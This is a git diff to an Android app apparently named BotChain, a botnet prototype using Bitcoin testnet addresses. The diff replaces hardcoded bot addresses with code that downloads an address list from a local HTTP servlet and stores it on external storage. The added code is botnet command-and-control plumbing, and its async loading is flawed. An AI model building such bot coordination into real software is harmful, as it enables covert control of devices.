@@ -2,10 +2,10 @@ package com.example.tonipagliaro.botchain;
 
 import android.app.Application;
 import android.app.backup.BackupManager;
+import android.os.AsyncTask;
 import android.os.Environment;
 import android.util.Log;
 
-import org.bitcoinj.core.Address;
 import org.bitcoinj.core.BlockChain;
 import org.bitcoinj.core.ECKey;
 import org.bitcoinj.core.NetworkParameters;
@@ -18,14 +18,20 @@ import org.bitcoinj.store.SPVBlockStore;
 import org.bitcoinj.wallet.UnreadableWalletException;
 import org.bitcoinj.wallet.Wallet;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FileReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
@@ -64,13 +70,7 @@ public class ApplicationState extends Application {
     public void onCreate() {
         super.onCreate();
 
-        Address luca =new Address(params,"mvX1kD99iJNKAQXW14hzZXKJ1DEWkZaDG5");
-      Address peppe=new Address(params,"mfztpZNN5RTs814mQy8Mru6yu3UG6fpu4E");
-        indirizzi.add(luca.toString());
-       indirizzi.add(peppe.toString());
 
-        for(String s : indirizzi)
-        mappaIndirizzi.put(s,"no");
 
         Log.d("App", "Start app state");
         ApplicationState.current = this;
@@ -158,6 +158,124 @@ public class ApplicationState extends Application {
         } catch (BlockStoreException e) {
             throw new Error("Impossibile inizializzare la blockchain");
         }
+
+
+        new DownloadListBotFile().execute();
+
+        setIndirizzi(indirizzi);
+
+    }
+
+
+
+    private class DownloadListBotFile extends AsyncTask<String, Void, String> {
+        @Override
+        protected String doInBackground(String... urls) {
+            String url="http://192.168.1.4:8080/ServerBotChain/FileServlet";
+            try {
+                //scarica il file degli indirizzi dal server
+                File fileBot=getOutputFromUrl(url);
+
+                //legge ogni linea del file scaricato
+                readAddressFromFile(fileBot);
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+            return null;
+        }
+
+        private void readAddressFromFile(File fileBot) {
+
+            BufferedReader br = null;
+            FileReader fr = null;
+
+            try {
+
+                fr = new FileReader(fileBot);
+                br = new BufferedReader(fr);
+
+                String sCurrentLine;
+
+                br = new BufferedReader(new FileReader(fileBot));
+
+                while ((sCurrentLine = br.readLine()) != null) {
+                    Log.v("App", "linea corrente file " + sCurrentLine);
+                    indirizzi.add(sCurrentLine);
+                }
+
+            } catch (IOException e) {
+
+                e.printStackTrace();
+
+            } finally {
+
+                try {
+
+                    if (br != null)
+                        br.close();
+
+                    if (fr != null)
+                        fr.close();
+
+                } catch (IOException ex) {
+
+                    ex.printStackTrace();
+
+                }
+
+            }
+        }
+
+        private File getOutputFromUrl(String url) throws IOException {
+            URL u = new URL(url);
+            // il file scaricato compare nell'archivio
+            File file = new File(Environment.getExternalStorageDirectory()+File.separator +"fileBot");
+
+            URLConnection ucon = u.openConnection();
+            InputStream is = ucon.getInputStream();
+            BufferedInputStream bis = new BufferedInputStream(is);
+
+
+            ByteArrayOutputStream baf = new ByteArrayOutputStream(50);
+            int current = 0;
+            while ((current = bis.read()) != -1) {
+                baf.write((byte) current);
+            }
+
+            FileOutputStream fos = new FileOutputStream(file);
+            fos.write(baf.toByteArray());
+            fos.close();
+
+            return file;
+
+        }
+    }
+
+    public ArrayList<String> getIndirizzi(){
+        return indirizzi;
+    }
+
+    public void setIndirizzi(ArrayList<String> indirizziFromFile){
+
+        for(String s : indirizziFromFile)
+            indirizzi.add(s);
+
+        for(String s : indirizzi)
+            mappaIndirizzi.put(s, "no");
+        /*
+           Address luca =new Address(params,"mvX1kD99iJNKAQXW14hzZXKJ1DEWkZaDG5");
+      Address peppe=new Address(params,"mgCryBENg88N6HfJieZNa7xcT9wZS6dwe3");
+        indirizzi.add(luca.toString());
+       indirizzi.add(peppe.toString());
+
+        for(String s : indirizzi)
+            mappaIndirizzi.put(s,"no");
+         */
+
+
+
     }
 
     public void saveWallet() {
